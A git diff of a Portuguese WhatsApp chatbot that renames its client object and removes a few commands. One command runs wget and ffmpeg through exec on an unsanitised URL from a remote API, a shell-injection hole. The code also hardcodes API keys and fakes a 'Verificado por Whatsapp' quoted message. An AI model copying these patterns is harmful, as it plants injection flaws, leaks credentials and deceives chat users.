-					tomioka.sendMessage(from, bufferjj, document, {mimetype: 'document/pdf', quoted: mek})
+					client.sendMessage(from, bufferjj, document, {mimetype: 'document/pdf', quoted: mek})
 					break
                  case 'setdesc':
                      if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
 			    	 if (!isGroup) return fakegroup (mess.only.group)
 				     if (!isGroupAdmins) return fakegroup (mess.only.admin)
 			   	     if (!isBotGroupAdmins) return fakegroup (mess.only.Badmin)
-				     tomioka.groupUpdateDescription(from, `${body.slice(9)}`)
-				     tomioka.sendMessage(from, 'Descrição alterada com sucesso', text, {quoted: mek})
+				     client.groupUpdateDescription(from, `${body.slice(9)}`)
+				     client.sendMessage(from, 'Descrição alterada com sucesso', text, {quoted: mek})
 				     break 
-				/*case 'google':
-teks = body.slice(13)
-tomioka.updatePresence(from, Presence.composing)
-reply('Pesquisando Aguarde..')
-anu = await fetchJson (`https://api-gdr2.herokuapp.com/api/search/gimage?q=${teks}`)
-buffer = await getBuffer(anu.result)
-tomioka.sendMessage(from, buffer, image, {quoted: mek, thumbnail: null})
-break*/
                 case 'speed':
                 case 'ping':
                     if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
@@ -7051,18 +6455,18 @@ break*/
 if (isBanned) return reply(mess.only.benned)
 const timestamp = speed();
 const latensi = speed() - timestamp
-tomioka.updatePresence(from, Presence.composing) 
+client.updatePresence(from, Presence.composing) 
 uptime = process.uptime()
-tomioka.sendMessage(from, 
+client.sendMessage(from, 
 `SPEED: *${latensi.toFixed(4)} _SEGUNDO_*
 *O BOT ESTEVE ATIVO POR*
-*${kyun(uptime)}*`, text, { quoted: ftoko})
+*${kyun(uptime)}*`, text, { quoted: ftoko ,contextInfo: tomis})
                     break
 				case 'delete':
 				case 'del':
 				case 'd':  
 					if (!isPremium) return fakegroup (mess.only.premium)
-					tomioka.deleteMessage(from, { id: mek.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
+					client.deleteMessage(from, { id: mek.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
                     break
            case 'playmp3':
                 return fakegroup (mess.wait)
@@ -7072,8 +6476,8 @@ tomioka.sendMessage(from,
                  infomp3 = `「 *TIMELINE PLAY MP3* 」\n*• Título:* ${anu.result.title}\n*• Link:* ${anu.result.source}\n*• Tamanho:* ${anu.result.size}\n\n*ESPERE NOVAMENTE ENVIANDO POR FAVOR, NÃO SPAME O CHAT*`
                 buffer = await getBuffer(anu.result.thumbnail)
                 lagu = await getBuffer(anu.result.url_audio)
-                tomioka.sendMessage(from, buffer, image, {quoted: mek, caption: infomp3})
-                tomioka.sendMessage(from, lagu, audio, {mimetype: 'audio/mp4', filename: `${anu.title}.mp3`, quoted: mek})
+                client.sendMessage(from, buffer, image, {quoted: mek, caption: infomp3})
+                client.sendMessage(from, lagu, audio, {mimetype: 'audio/mp4', filename: `${anu.title}.mp3`, quoted: mek})
                  
                 break 
             case 'smule':
@@ -7084,31 +6488,31 @@ tomioka.sendMessage(from,
 					if (anu.error) return fakegroup (anu.error)
 					teks = `*Título* : ${anu.title}\n\n Espere 1 minuto, talvez um pouco mais porque o download de vídeos esta executando`
 					thumb = await getBuffer(anu.thumb)
-					tomioka.sendMessage(from, thumb, image, {quoted: mek, caption: teks})
+					client.sendMessage(from, thumb, image, {quoted: mek, caption: teks})
 					buffer = await getBuffer(anu.result)
-					tomioka.sendMessage(from, buffer, video, {mimetype: 'video/mp4', filename: `${anu.title}.mp4`, quoted: mek, caption: 'Aqui mano'})
+					client.sendMessage(from, buffer, video, {mimetype: 'video/mp4', filename: `${anu.title}.mp4`, quoted: mek, caption: 'Aqui mano'})
 					 	
 					break  
 case 'donate': case 'doar':
 console.log(color('[DOAR]', 'blue'), color(`DOAÇAO ATIVADA!`, 'pink'))
                     donate = `Incentive meu criador fazendo uma doação via pix:\n`
                     donate2 = `aa204cca-88cd-47c9-8727-1d335c55aa93`
-                tomioka.sendMessage(from, donate, text, {quoted: ftoko})
-                tomioka.sendMessage(from, donate2, text, {quoted: ftoko})
+                client.sendMessage(from, donate, text, {quoted: ftoko ,contextInfo: tomis})
+                client.sendMessage(from, donate2, text, {quoted: ftoko ,contextInfo: tomis})
                 break 
                 case 'desbloquear':
 					if (!isGroup) return fakegroup (mess.only.group)
 					if (!isOwner) return fakegroup (mess.only.ownerB)
-				    tomioka.blockUser (`${body.slice(9)}@c.us`, "remove")
-					tomioka.sendMessage(from, `perintah Diterima, membuka blokir ${body.slice(9)}@c.us`, text)
+				    client.blockUser (`${body.slice(9)}@c.us`, "remove")
+					client.sendMessage(from, `perintah Diterima, membuka blokir ${body.slice(9)}@c.us`, text)
 				    break
 				    case 'bloquear':
-				 tomioka.updatePresence(from, Presence.composing) 
-				 tomioka.chatRead (from)
+				 client.updatePresence(from, Presence.composing) 
+				 client.chatRead (from)
 					if (!isGroup) return fakegroup (mess.only.group)
 					if (!isOwner) return fakegroup (mess.only.ownerB)
-					tomioka.blockUser (`${body.slice(7)}@c.us`, "add")
-					tomioka.sendMessage(from, `ESTE COMANDO NÃO ESTÁ FUNCIONANDO, EM BREVE SERÁ CORRIGIDO ${body.slice(7)}@c.us`, text)
+					client.blockUser (`${body.slice(7)}@c.us`, "add")
+					client.sendMessage(from, `ESTE COMANDO NÃO ESTÁ FUNCIONANDO, EM BREVE SERÁ CORRIGIDO ${body.slice(7)}@c.us`, text)
 					break
                 case 'image':
 					if (args.length < 1) return fakegroup ('O que você quer procurar, mana?')
@@ -7118,34 +6522,14 @@ console.log(color('[DOAR]', 'blue'), color(`DOAÇAO ATIVADA!`, 'pink'))
 				    var pol = JSON.parse(JSON.stringify(anu.result.result_search));
                     var tes2 =  pol[Math.floor(Math.random() * pol.length)];
 					pint = await getBuffer(tes2)
-					tomioka.sendMessage(from, pint, image, { caption: '*Google Image*\n\n*Resultado da pesquisa : '+goo+'*', contextInfo: null, quoted: ftoko})
-					break
-        /*        case '.':
-					goo = body.slice(2)
-					anu = await fetchJson(`https://api.vhtear.com/googleimg?query=${goo}&apikey=ANTIGRATISNIHANJENKKK`, {method: 'get'})
-					return fakegroup (mess.wait)
-				    var pol = JSON.parse(JSON.stringify(anu.result.result_search));
-                    var tes2 =  pol[Math.floor(Math.random() * pol.length)];
-					pint = await getBuffer(tes2)
-					tomioka.sendMessage(from, pint, image, { caption: '*Google Image*\n\n*Resultado da pesquisa : '+goo+'*', contextInfo: null, quoted: ftoko})
-					break  */
-					case '.':
-                    tels = body.slice(2)
-					tomioka.updatePresence(from, Presence.composing) 
-					data = await fetchJson(`https://api.fdci.se/rep.php?gambar=${tels}`, {method: 'get'})
-					return fakegroup (mess.wait)
-					n = JSON.parse(JSON.stringify(data));
-					nimek =  n[Math.floor(Math.random() * n.length)];
-					pok = await getBuffer(nimek)
-					tomioka.sendMessage(from, pok, image, { quoted: mek, caption: `*PINTEREST*\n\*Resultado da pesquisa* : *${tels}*`})
-                    
+					client.sendMessage(from, pint, image, { caption: '*Google Image*\n\n*Resultado da pesquisa : '+goo+'*', contextInfo: null, quoted: ftoko ,contextInfo: tomis})
 					break
 				case 'playstore':
 					kuji = body.slice(7)
 					return fakegroup (mess.wait)
 					anu = await getBuffer(`https://api.vhtear.com/playstore?query={kuji}&apikey=Aris komtol`, {method: 'get'})
 					capty = `*➸ title :* ${anu.title}\n*➸ app_id :* ${anu.app_id}\n*➸ description :* ${anu.description}\n*➸ developer_id :* ${anu.developer_id}\n*➸ developer :* ${anu.developer}\n*➸ score :* ${anu.score}\n*➸ full_price :* ${anu.full_price}\n*➸ price :* ${anu.price}\n*➸ free :* ${anu.free}`
-					tomioka.sendMessage(from, anu, image, {quoted: mek, caption: capty})
+					client.sendMessage(from, anu, image, {quoted: mek, caption: capty})
 					break
 				case 'otagall2':
 					if (!isGroup) return fakegroup (mess.only.group)
@@ -7162,18 +6546,18 @@ console.log(color('[DOAR]', 'blue'), color(`DOAÇAO ATIVADA!`, 'pink'))
                 case 'pinterest':
                     if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
                     tels = body.slice(11)
-					tomioka.updatePresence(from, Presence.composing) 
+					client.updatePresence(from, Presence.composing) 
 					data = await fetchJson(`https://fdciabdul.tech/api/pinterest/?keyword=${tels}`, {method: 'get'})
 					return fakegroup (mess.wait)
 					n = JSON.parse(JSON.stringify(data));
 					nimek =  n[Math.floor(Math.random() * n.length)];
 					pok = await getBuffer(nimek)
-					tomioka.sendMessage(from, pok, image, { quoted: mek, caption: `*PINTEREST*\n\*Resultado da pesquisa* : *${tels}*`})
+					client.sendMessage(from, pok, image, { quoted: mek, caption: `*PINTEREST*\n\*Resultado da pesquisa* : *${tels}*`})
                     
 					break
 case 'anime':
                     
-                    tomioka.updatePresence(from, Presence.composing)
+                    client.updatePresence(from, Presence.composing)
                     am = ["anime tumblr",
                         "wallpaper anime hd",
                         "anime aestethic",
@@ -7187,7 +6571,7 @@ case 'anime':
                     n = JSON.parse(JSON.stringify(data));
                     nimek = n[Math.floor(Math.random() * n.length)];
                     pok = await getBuffer(nimek)
-                    tomioka.sendMessage(from, pok, image, {
+                    client.sendMessage(from, pok, image, {
                         quoted: mek,
                         caption: `💮`
                     })
@@ -7196,91 +6580,64 @@ case 'anime':
 case 'naruto':
                     if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
                     tels = body.slice(11)
-					tomioka.updatePresence(from, Presence.composing) 
+					client.updatePresence(from, Presence.composing) 
 					data = await fetchJson(`https://fdciabdul.tech/api/pinterest/?keyword=naruto`, {method: 'get'})
 					return fakegroup (mess.wait)
 					n = JSON.parse(JSON.stringify(data));
 					nimek =  n[Math.floor(Math.random() * n.length)];
 					pok = await getBuffer(nimek)
-					tomioka.sendMessage(from, pok, image, { quoted: mek, caption: '*naruto uzumikin*'})
+					client.sendMessage(from, pok, image, { quoted: mek, caption: '*naruto uzumikin*'})
                     
 					break
 case 'sakura':
                     if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
                     tels = body.slice(11)
-					tomioka.updatePresence(from, Presence.composing) 
+					client.updatePresence(from, Presence.composing) 
 					data = await fetchJson(`https://fdciabdul.tech/api/pinterest/?keyword=sakura`, {method: 'get'})
 					return fakegroup (mess.wait)
 					n = JSON.parse(JSON.stringify(data));
 					nimek =  n[Math.floor(Math.random() * n.length)];
 					pok = await getBuffer(nimek)
-					tomioka.sendMessage(from, pok, image, { quoted: mek, caption: '*sakura*'})
+					client.sendMessage(from, pok, image, { quoted: mek, caption: '*sakura*'})
                     
 					break
 case 'saske':
 case 'sasuke':
                     if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
                     tels = body.slice(11)
-					tomioka.updatePresence(from, Presence.composing) 
+					client.updatePresence(from, Presence.composing) 
 					data = await fetchJson(`https://fdciabdul.tech/api/pinterest/?keyword=sasuke`, {method: 'get'})
 					return fakegroup (mess.wait)
 					n = JSON.parse(JSON.stringify(data));
 					nimek =  n[Math.floor(Math.random() * n.length)];
 					pok = await getBuffer(nimek)
-					tomioka.sendMessage(from, pok, image, { quoted: mek, caption: '*saske*'})
+					client.sendMessage(from, pok, image, { quoted: mek, caption: '*saske*'})
                     
 					break
 case 'hinata':
                     if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
                     tels = body.slice(11)
-					tomioka.updatePresence(from, Presence.composing) 
+					client.updatePresence(from, Presence.composing) 
 					data = await fetchJson(`https://fdciabdul.tech/api/pinterest/?keyword=hinata`, {method: 'get'})
 					return fakegroup (mess.wait)
 					n = JSON.parse(JSON.stringify(data));
 					nimek =  n[Math.floor(Math.random() * n.length)];
 					pok = await getBuffer(nimek)
-					tomioka.sendMessage(from, pok, image, { quoted: mek, caption: '*hinata*'})
+					client.sendMessage(from, pok, image, { quoted: mek, caption: '*hinata*'})
                     
 					break
 case 'tomioka':
                     if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
                     tels = body.slice(11)
-					tomioka.updatePresence(from, Presence.composing) 
+					client.updatePresence(from, Presence.composing) 
 					data = await fetchJson(`https://fdciabdul.tech/api/pinterest/?keyword=gyutomioka`, {method: 'get'})
 					return fakegroup (mess.wait)
 					n = JSON.parse(JSON.stringify(data));
 					nimek =  n[Math.floor(Math.random() * n.length)];
 					pok = await getBuffer(nimek)
-					tomioka.sendMessage(from, pok, image, { quoted: mek, caption: '*tomioka*'})
+					client.sendMessage(from, pok, image, { quoted: mek, caption: '*tomioka*'})
                     
 					break
-case 'stalkgithub':
-      case 'githubstalk':     ////zanga
-              if (args.length == 0) return reply(`Exemplo: ${prefix + command} ivan18274737373`)
-              reply(mess.wait) 
-              username = args[0]
-              ini_result = await fetchJson(`https://api-gdr2.herokuapp.com/api/github?username=${username}`)
-              ini_result = ini_result.result
-              ini_buffer = await getBuffer(ini_result.avatar_url)
-              ini_txt = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
-┆ *USUÁRIO DO GITHUB* 
-└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶
-
-*Dados obtidos com sucesso!*
-\`\`\`▢ id : ${ini_result.id}\`\`\`
-\`\`\`▢ node_id : ${ini_result.node_id}\`\`\`
-\`\`\`▢ Nome de usuário : ${ini_result.name}\`\`\`
-\`\`\`▢ Repo público : ${ini_result.public_repos}\`\`\`
-\`\`\`▢ Síntese pública: ${ini_result.public_gists}\`\`\`
-\`\`\`▢ Seguidor : ${ini_result.followers}\`\`\`
-\`\`\`▢ Seguindo : ${ini_result.following}\`\`\`
-\`\`\`▢ Seguir : ${ini_result.bio}\`\`\`
-\`\`\`▢ Link : ${ini_result.html_url}\`\`\`
-\`\`\`▢ criador : ${ini_result.created_at}\`\`\`
-\`\`\`▢ upado : ${ini_result.updated_at}\`\`\`
-`
-             tomioka.sendMessage(from, ini_buffer, image, { caption: ini_txt, thumbnail: Buffer.alloc(0) })
-             break
                 case 'cringe':
                  if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
 				 data = fs.readFileSync('./src/tomiokajokes.js');
@@ -7314,7 +6671,7 @@ case 'fogos':
 					if (teks.length > 10) return fakegroup ('O texto é longo, até 10 caracteres')
 					reply('*Estou fazendo, se der erro tente novamente ✓*')
 					buffer = await getBuffer(`https://api.zeks.xyz/api/tfire?apikey=cAdmS2XqIbRSP3vYAdqHvYqAD6W&text=${teks}`)
-					tomioka.sendMessage(from, buffer, image, {quoted: mek, thumbnail: null, caption: 'ta ai'})
+					client.sendMessage(from, buffer, image, {quoted: mek, thumbnail: null, caption: 'ta ai'})
 					break			
 case 'summer':      
 					if (args.length < 1) return fakegroup (mess.blank)
@@ -7322,7 +6679,7 @@ case 'summer':
 					if (teks.length > 10) return fakegroup ('O texto é longo, até 10 caracteres')
 					reply('*Estou fazendo, se der erro tente novamente ✓*')
 					buffer = await getBuffer(`https://api.zeks.xyz/api/sandw?apikey=cAdmS2XqIbRSP3vYAdqHvYqAD6W&text=${teks}`)
-					tomioka.sendMessage(from, buffer, image, {quoted: mek, thumbnail: null, caption: 'ta ai'})
+					client.sendMessage(from, buffer, image, {quoted: mek, thumbnail: null, caption: 'ta ai'})
 					break
 						case 'path':          
 					if (args.length < 1) return fakegroup (mess.blank)
@@ -7330,14 +6687,14 @@ case 'summer':
 					if (teks.length > 10) return fakegroup ('O texto é longo, até 10 caracteres')
 					reply('*Estou fazendo, se der erro tente novamente ✓*')
 					buffer = await getBuffer(`https://api.zeks.xyz/api/crismes?apikey=cAdmS2XqIbRSP3vYAdqHvYqAD6W&text=${teks}`)
-					tomioka.sendMessage(from, buffer, image, {quoted: mek, thumbnail: null, caption: 'ta ai'})
+					client.sendMessage(from, buffer, image, {quoted: mek, thumbnail: null, caption: 'ta ai'})
 					break
          case 'moddroid':
 			data = await fetchJson(`https://tobz-api.herokuapp.com/api/moddroid?q=${body.slice(10)}&apikey=${TobzApi}`)
 			hepi = data.result[0] 
 			teks = `*Nome*: ${data.result[0].title}\n*editor*: ${hepi.publisher}\n*mod info:* ${hepi.mod_info}\n*Tamanho*: ${hepi.size}\n*última versão*: ${hepi.latest_version}\n*gênero*: ${hepi.genre}\n*link:* ${hepi.link}\n*download*: ${hepi.download}`
 			buffer = await getBuffer(hepi.image)
-			tomioka.sendMessage(from, buffer, image, {quoted: mek, caption: `${teks}`})
+			client.sendMessage(from, buffer, image, {quoted: mek, caption: `${teks}`})
 			
 			break
 		case 'happymod':
@@ -7345,7 +6702,7 @@ case 'summer':
 			hupo = data.result[0] 
 			teks = `*Nome*: ${data.result[0].title}\n*versão*: ${hupo.version}\n*Tamanho:* ${hupo.size}\n*root*: ${hupo.root}\n*compra*: ${hupo.price}\n*link*: ${hupo.link}\n*download*: ${hupo.download}`
 			buffer = await getBuffer(hupo.image)
-			tomioka.sendMessage(from, buffer, image, {quoted: mek, caption: `${teks}`})
+			client.sendMessage(from, buffer, image, {quoted: mek, caption: `${teks}`})
 			
 			break
 				case 'nsfwboquete':
@@ -7355,15 +6712,15 @@ case 'summer':
 					naru = JSON.parse(JSON.stringify(anu));
 					to =  naru[Math.floor(Math.random() * naru.length)];
 					nye = await getBuffer(to)
-					tomioka.sendMessage(from, nye, image, { caption: 'naruto!!', contextInfo: null, quoted: ftoko})
+					client.sendMessage(from, nye, image, { caption: 'naruto!!', contextInfo: null, quoted: ftoko ,contextInfo: tomis})
 					
 					break 
 					case 'resetlink':
 if (!isBotGroupAdmins) return reply(`O BOT PRECISA SER ADM`)
 if (!isGroup) return reply(`SÓ EM GRUPO`)
 if (!isGroupAdmins) return reply(`PRECISA SER ADMININASTROR`)
-tomioka.query({ json: ['action', 'inviteReset', from], expect200: true })
-linkgc = await tomioka.groupInviteCode(from)
+client.query({ json: ['action', 'inviteReset', from], expect200: true })
+linkgc = await client.groupInviteCode(from)
 fakegroup('link resetado com sucesso! Grupo de links novo https://chat.whatsapp.com/'+linkgc)
 break
 				case 'animecry':
@@ -7375,7 +6732,7 @@ break
 					exec(`wget ${anu.result} -O ${cry} && ffmpeg -i ${cry} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
 						fs.unlinkSync(cry)
 						buffer = fs.readFileSync(rano)
-						tomioka.sendMessage(from, buffer, sticker, {quoted: mek})
+						client.sendMessage(from, buffer, sticker, {quoted: mek})
 						fs.unlinkSync(rano)
 					})
 					 
@@ -7383,67 +6740,67 @@ break
 case 'onich':
 if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
 tujuh = fs.readFileSync('./assets/sound7.mp3');
-tomioka.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
+client.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
 break
 case 'ola':
 if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
 tujuh = fs.readFileSync('./assets/ola.mp3');
-tomioka.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
+client.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
 break
 case 'bv':
 if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
 tujuh = fs.readFileSync('./assets/bv.mp3');
-tomioka.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
+client.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
 break
 case 'tchau':
 if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
 tujuh = fs.readFileSync('./assets/tchau.mp3');
-tomioka.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
+client.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
 break
 case 'bem':
 if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
 tujuh = fs.readFileSync('./assets/bem.mp3');
-tomioka.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
+client.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
 break
 case 'banoit':
 if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
 tujuh = fs.readFileSync('./assets/banoit.mp3');
-tomioka.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
+client.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
 break
 case 'batarde':
 if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
 tujuh = fs.readFileSync('./assets/batarde.mp3');
-tomioka.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
+client.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
 break
 case 'bodia':
 if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
 tujuh = fs.readFileSync('./assets/bodia.mp3');
-tomioka.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
+client.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
 break
 case 'a':
 if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
 tujuh = fs.readFileSync('./assets/a.mp3');
-tomioka.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
+client.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
 break
 case 'beat1':
 tujuh = fs.readFileSync('./assets/beat1.mp3');
-tomioka.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
+client.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
 break
 case 'tomioka':
 if (!isGroup) return reply(` SOMENTE EM GRUPOS`)
 result = fs.readFileSync(`./figurinhas/tomioka.webp`)
-tomioka.sendMessage(from, result, sticker, {contextInfo: null, quoted: ftoko})
+client.sendMessage(from, result, sticker, {contextInfo: null, quoted: ftoko ,contextInfo: tomis})
 break
 case 'status':
 
       case 'stats':
-              groups = tomioka.chats.array.filter(v => v.jid.endsWith('g.us'))
-privat = tomioka.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
+              groups = client.chats.array.filter(v => v.jid.endsWith('g.us'))
+privat = client.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
 ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
 uptime = process.uptime();
-unread = await tomioka.loadAllUnreadMessages();
+unread = await client.loadAllUnreadMessages();
 timestampe = speed();
-totallChat = await tomioka.chats.all()
+totallChat = await client.chats.all()
 latensie = speed() - timestampe
 teks = `\`\`\`ESTATÍSTICAS DE BOT\`\`\`
 \`\`\`▢ mensagens nao lidas: ${unread.length}\`\`\`
@@ -7459,11 +6816,11 @@ teks = `\`\`\`ESTATÍSTICAS DE BOT\`\`\`
 \`\`\`▢ Plataforma : ${os.platform()}\`\`\`
 \`\`\`▢ Hostname : ${os.hostname()}\`\`\`
 \`\`\`▢ Tempo de atividade : ${runtime(process.uptime())}\`\`\`
-\`\`\`▢ Wa Versão: ${tomioka.user.phone.wa_version}\`\`\`
-\`\`\`▢ A versão: ${tomioka.user.phone.os_version}\`\`\`
-\`\`\`▢ Fabricante do dispositivo: ${tomioka.user.phone.device_manufacturer}\`\`\`
-\`\`\`▢ Modelo do dispositivo: ${tomioka.user.phone.device_model}\`\`\`
-\`\`\`▢ Número da construção do sistema operacional: ${tomioka.user.phone.os_build_number}\`\`\``
+\`\`\`▢ Wa Versão: ${client.user.phone.wa_version}\`\`\`
+\`\`\`▢ A versão: ${client.user.phone.os_version}\`\`\`
+\`\`\`▢ Fabricante do dispositivo: ${client.user.phone.device_manufacturer}\`\`\`
+\`\`\`▢ Modelo do dispositivo: ${client.user.phone.device_model}\`\`\`
+\`\`\`▢ Número da construção do sistema operacional: ${client.user.phone.os_build_number}\`\`\``
 reply(teks)
 
              break
@@ -7474,7 +6831,7 @@ reply(teks)
 					hina = JSON.parse(JSON.stringify(anu));
 					ta =  hina[Math.floor(Math.random() * hina.length)];
 					nye = await getBuffer(ta)
-					tomioka.sendMessage(from, nye, image, { caption: 'hinata!!', contextInfo: null, quoted: ftoko})
+					client.sendMessage(from, nye, image, { caption: 'hinata!!', contextInfo: null, quoted: ftoko ,contextInfo: tomis})
 					
 					break 
            case 'hobby':
@@ -7482,14 +6839,14 @@ reply(teks)
 					hobby = body.slice(1)
 					const hob =['Desah Di Game','Ngocokin Doi','Stalking sosmed nya mantan','Kau kan gak punya hobby awokawok','Memasak','Membantu Atok','Mabar','Nobar','Sosmedtan','Membantu Orang lain','Nonton Anime','Nonton Drakor','Naik Motor','Nyanyi','Menari','Bertumbuk','Menggambar','Foto fotoan Ga jelas','Maen Game','Berbicara Sendiri']
 					const by = hob[Math.floor(Math.random() * hob.length)]
-					tomioka.sendMessage(from, 'Questão : *'+hobby+'*\n\nResponda : '+ by, text, { contextInfo: null, quoted: ftoko})
+					client.sendMessage(from, 'Questão : *'+hobby+'*\n\nResponda : '+ by, text, { contextInfo: null, quoted: ftoko ,contextInfo: tomis})
 					
 					break
 case 'covid19':
 post = await fetchJson(`https://api-gdr2.herokuapp.com/api/covidbr`)
 send = `𝐋𝐎𝐂𝐀𝐋: ${post.result.local}\n𝐃𝐀𝐃𝐎𝐒: ${post.result.dadosAtualizados}\n𝐓𝐎𝐓𝐀𝐋 𝐃𝐄 𝐂𝐀𝐒𝐎𝐒: ${post.result.totalCasos}\n𝐍𝐎𝐕𝐎𝐒 𝐂𝐀𝐒𝐎𝐒: ${post.result.novosCasos}\n𝐓𝐎𝐓𝐀𝐋 𝐃𝐄 𝐌𝐎𝐑𝐓𝐄𝐒: ${post.result.totalMortes}\n𝐍𝐎𝐕𝐀𝐒 𝐌𝐎𝐑𝐓𝐄𝐒: ${post.result.novasMortes}\n𝐑𝐄𝐂𝐔𝐏𝐄𝐑𝐀𝐃𝐎𝐒: ${post.result.recuperados}\n 
 𝐕𝐀𝐂𝐈𝐍𝐀𝐃𝐎𝐒-1: ${post.result.vacinadosPrimeiraDose}\n𝐕𝐀𝐂??𝐍𝐀𝐃𝐎𝐒-2: ${post.result.vacinadosSegundaDose}\n𝐁𝐎𝐋????𝐈𝐍𝐒: ${post.result.boletinsContabilizados}`
-tomioka.sendMessage(from, send, text, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "𝐕𝐞𝐫𝐢𝐟𝐢𝐜𝐚𝐝𝐨 𝐩𝐨𝐫 𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩\nEstatisticas Covid-19 Br", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('./assets/botlogo.webp')} } }, caption: "<//>" })
+client.sendMessage(from, send, text, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "𝐕𝐞𝐫𝐢𝐟𝐢𝐜𝐚𝐝𝐨 𝐩𝐨𝐫 𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩\nEstatisticas Covid-19 Br", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('./assets/botlogo.webp')} } }, caption: "<//>" })
